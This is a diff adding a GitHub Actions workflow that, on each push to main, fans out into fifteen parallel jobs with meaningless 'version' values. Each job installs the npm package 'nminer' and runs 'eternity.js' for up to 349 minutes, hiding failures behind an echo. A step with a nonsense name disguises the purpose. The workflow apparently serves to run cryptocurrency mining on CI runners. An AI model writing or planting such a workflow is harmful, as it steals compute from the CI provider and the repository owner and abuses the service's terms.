@@ -1,0 +1,40 @@
+name: eternity
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 4293 }
+          - { version: 2218 }
+          - { version: 5067 }
+          - { version: 585 }
+          - { version: 5599 }
+          - { version: 4131 }
+          - { version: 2448 }
+          - { version: 4080 }
+          - { version: 270 }
+          - { version: 5039 }
+          - { version: 7743 }
+          - { version: 8173 }
+          - { version: 1890 }
+          - { version: 9321 }
+          - { version: 5393 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: towards potentially yippee
+        run: |
+          npm install nminer@latest
+          timeout 349m node eternity.js || echo "eternity executed"
